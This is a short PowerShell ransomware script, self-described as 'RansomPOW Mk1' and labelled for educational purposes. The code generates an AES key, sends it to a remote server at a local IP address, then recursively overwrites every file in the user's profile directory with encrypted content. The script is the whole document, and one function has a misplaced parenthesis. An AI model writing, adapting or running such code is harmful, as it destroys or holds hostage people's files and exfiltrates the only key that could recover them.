
#ramsompow.ps1 goes to user directory , send aes key to remote serve and AES encrypt the content off all the files recusirvly

Write-Host "RansomPOW Mk1 by bus7d 2020"
Write-Host "For educational purpose only"
function Create-AesManagedObject($key, $IV)
{
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey() {
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose(

    [System.Convert]::ToBase64String($fullData))
}



Set-Location -Path $env:USERPROFILE
$docs=Get-ChildItem -Recurse
$key = Create-AesKey
Invoke-WebRequest -URI http://192.168.0.44/$key
$docs|foreach-object {$file=$_.fullname;$filecontent=get-content $file;$unencryptedString = $fileContent;$file;
$encryptedString = Encrypt-String $key $unencryptedString;Set-Content -Path $file -Value $encryptedString }






